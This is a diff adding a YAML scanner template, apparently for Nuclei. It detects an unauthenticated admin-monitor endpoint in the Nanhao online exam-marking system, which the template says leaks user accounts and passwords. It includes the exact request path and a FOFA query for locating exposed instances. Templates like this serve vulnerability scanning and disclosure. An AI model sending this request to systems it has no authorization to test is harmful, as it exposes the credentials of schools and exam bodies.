@@ -1,0 +1,30 @@
+id: nhexam-admin-unauth
+info:
+  name: 南昊网上阅卷系统 monitor 未授权访问
+  author: leadlife
+  severity: high
+  description: 南昊网上阅卷系统是一款专为教育领域设计的在线阅卷工具，它能够帮助教师和考试机构实现高效、准确的试卷评阅。系统/exam/monitor/index,jsp存在未授权访问，远程攻击者可通过该接口获取用户账号与密码，造成信息泄露。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483814&idx=1&sn=8d814cd206768217e16a0861b624e679&chksm=9606e734a1716e22472d41ad1a57a1ba1f8e8b864e7f77125bfec859fbf20a68516baa2c0e39&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="南昊网上阅卷系统"
+    tips:
+    repair:
+    version:
+  tags: unauth,nhexam
+
+http:
+  - raw:
+      - |
+        GET /exam/monitor/index.jsp?logname=admin HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'admin','index_Main','管理员','重新登录')
+        condition: and
